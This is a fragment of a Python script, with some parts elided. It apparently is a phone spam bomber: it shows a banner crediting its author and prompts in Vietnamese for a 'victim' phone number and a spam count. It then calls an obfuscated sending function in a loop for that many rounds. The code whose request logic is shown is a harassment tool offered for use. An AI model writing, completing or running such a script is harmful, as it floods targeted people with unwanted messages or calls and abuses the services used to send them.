...
os.system('color 07' if os.name == "nt" else 'echo -e "\033[0m"')
os.system('cls' if os.name == 'nt' else 'clear')

ban = f"""
\033[33m _____   ___      _     _   _     _   _   ____  _   _\033[0m
\033[33m|_   _| / _ \    / \   | \ | |   | \ | | / ___|| | | |\033[0m
\033[33m  | |  | | | |  / _ \  |  \| |   |  \| || |  _ | | | |\033[0m
\033[33m  | |  | |_| | / ___ \ | |\  |   | |\  || |_| || |_| |\033[0m
\033[33m  |_|   \___/ /_/   \_\|_| \_|   |_| \_| \____| \___/\033[0m


                                                                                     
           \033[33m     © Copyright KHÁNH TOÀN \033[0m
           \033[33m     Facebook : Khánh Tòn \033[0m
           \033[33m     Link : facebook.com/dang.hoc.cyber \033[0m
"""
...
def man():
    ...
    try:
        phone = input("\033[0mNhập sdt nạn nhân:")
        count = int(input("Nhập số lần spam: "))
        if count == 0:
            print("\033[31mĐã thoát chương trình\033[0")
            sleep(2)
        else:
            print("\033[0mBắt đầu chương trình...")
            for i in range(1, count + 1):
                LJJJJLJIJLLJLJILJLIILLIIL(phone, i)
    except KeyboardInterrupt:
        print("\n\033[31mĐã dừng chương trình bởi người dùng\033[0")
        time.sleep(2)
